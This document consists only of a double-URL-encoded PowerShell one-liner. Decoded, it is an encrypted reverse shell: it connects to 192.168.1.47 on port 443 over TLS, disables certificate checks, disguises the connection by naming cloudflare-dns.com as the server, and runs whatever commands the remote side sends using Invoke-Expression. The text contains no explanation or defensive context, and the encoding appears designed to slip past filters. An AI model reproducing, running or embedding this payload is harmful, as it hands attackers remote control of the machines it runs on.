%2524sslProtocols%2520%253D%2520%255BSystem.Security.Authentication.SslProtocols%255D%253A%253ATls12%253B%2520%2524TCPClient%2520%253D%2520New-Object%2520Net.Sockets.TCPClient%2528%2527192.168.1.47%2527%252C%2520443%2529%253B%2524NetworkStream%2520%253D%2520%2524TCPClient.GetStream%2528%2529%253B%2524SslStream%2520%253D%2520New-Object%2520Net.Security.SslStream%2528%2524NetworkStream%252C%2524false%252C%2528%257B%2524true%257D%2520-as%2520%255BNet.Security.RemoteCertificateValidationCallback%255D%2529%2529%253B%2524SslStream.AuthenticateAsClient%2528%2527cloudflare-dns.com%2527%252C%2524null%252C%2524sslProtocols%252C%2524false%2529%253Bif%2528%2521%2524SslStream.IsEncrypted%2520-or%2520%2521%2524SslStream.IsSigned%2529%2520%257B%2524SslStream.Close%2528%2529%253Bexit%257D%2524StreamWriter%2520%253D%2520New-Object%2520IO.StreamWriter%2528%2524SslStream%2529%253Bfunction%2520WriteToStream%2520%2528%2524String%2529%2520%257B%255Bbyte%255B%255D%255D%2524script%253ABuffer%2520%253D%2520New-Object%2520System.Byte%255B%255D%25204096%2520%253B%2524StreamWriter.Write%2528%2524String%2520%252B%2520%2527SHELL%253E%2520%2527%2529%253B%2524StreamWriter.Flush%2528%2529%257D%253BWriteToStream%2520%2527%2527%253Bwhile%2528%2528%2524BytesRead%2520%253D%2520%2524SslStream.Read%2528%2524Buffer%252C%25200%252C%2520%2524Buffer.Length%2529%2529%2520-gt%25200%2529%2520%257B%2524Command%2520%253D%2520%2528%255Btext.encoding%255D%253A%253AUTF8%2529.GetString%2528%2524Buffer%252C%25200%252C%2520%2524BytesRead%2520-%25201%2529%253B%2524Output%2520%253D%2520try%2520%257BInvoke-Expression%2520%2524Command%25202%253E%25261%2520%257C%2520Out-String%257D%2520catch%2520%257B%2524_%2520%257C%2520Out-String%257DWriteToStream%2520%2528%2524Output%2529%257D%2524StreamWriter.Close%2528%2529
